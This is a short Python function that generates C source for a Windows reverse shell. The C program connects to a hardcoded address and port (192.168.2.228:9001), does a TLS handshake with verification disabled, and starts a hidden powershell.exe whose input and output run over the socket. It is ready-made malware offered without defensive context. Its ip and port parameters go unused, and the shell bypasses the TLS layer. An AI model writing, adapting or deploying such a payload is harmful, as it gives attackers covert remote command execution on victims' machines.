






def make_raw(ip, port):
	payload = f"""
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#include <openssl/ssl.h>
#include <openssl/err.h>

#ifndef CLIENT_IP
# define CLIENT_IP "192.168.2.228"
#endif
#ifndef CLIENT_PORT
# define CLIENT_PORT 9001
#endif

int main(void) {{
	WSADATA wsa;
	if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {{
		fprintf(stderr, "[!] WSAStartup failed\n");
		return 1;
	}}

	SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (s == INVALID_SOCKET) {{
		fprintf(stderr, "[!] socket() failed\n");
		return 1;
	}}
	struct sockaddr_in sa = {{
		.sin_family = AF_INET,
		.sin_port   = htons(CLIENT_PORT),
		.sin_addr.s_addr = inet_addr(CLIENT_IP),
	}};
	if (connect(s, (struct sockaddr*)&sa, sizeof sa) != 0) {{
		fprintf(stderr, "[!] connect() failed\n");
		return 1;
	}}

	SSL_library_init();
	SSL_load_error_strings();
	OpenSSL_add_all_algorithms();

	SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
	if (!ctx) {{
		ERR_print_errors_fp(stderr);
		return 1;
	}}

	SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);

	SSL *ssl = SSL_new(ctx);
	SSL_set_fd(ssl, (int)s);

	if (SSL_connect(ssl) != 1) {{
		ERR_print_errors_fp(stderr);
		return 1;
	}}
	printf("[+] TLS handshake complete with %s:%d\n", CLIENT_IP, CLIENT_PORT);

	STARTUPINFOA si = {{ sizeof si }};
	PROCESS_INFORMATION pi;
	HANDLE hSock = (HANDLE)_get_osfhandle((intptr_t)s);

	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput  = hSock;
	si.hStdOutput = hSock;
	si.hStdError  = hSock;

	if (!CreateProcessA(
			NULL,
			"powershell.exe",
			NULL, NULL, TRUE,
			CREATE_NO_WINDOW,
			NULL, NULL,
			&si, &pi
		))
	{{
		fprintf(stderr, "[!] CreateProcess failed: %u\n", GetLastError());
		return 1;
	}}

	WaitForSingleObject(pi.hProcess, INFINITE);

	SSL_shutdown(ssl);
	SSL_free(ssl);
	SSL_CTX_free(ctx);
	closesocket(s);
	WSACleanup();
	return 0;
}}
"""